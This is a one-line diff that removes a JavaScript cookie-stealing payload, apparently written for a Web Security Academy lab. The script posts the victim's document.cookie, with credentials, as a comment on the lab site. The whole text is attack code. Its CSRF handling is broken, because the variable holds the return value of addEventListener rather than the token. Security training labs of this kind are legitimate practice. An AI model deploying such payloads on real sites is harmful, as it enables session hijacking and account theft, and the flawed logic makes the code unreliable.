@@ -1,1 +1,0 @@
-var csrf = window.addEventListener("load", function(){(document.getElementsByName("csrf")[0].value);});var http = new XMLHttpRequest();http.open('post','https://0a19006c03c859d1839025b800fe0075.web-security-academy.net/post/comment');http.withCredentials = true;http.send("csrf="+csrf+"&postId=7&comment="+document.cookie.replace("=", "")+"&name=name&email=email@email.com");
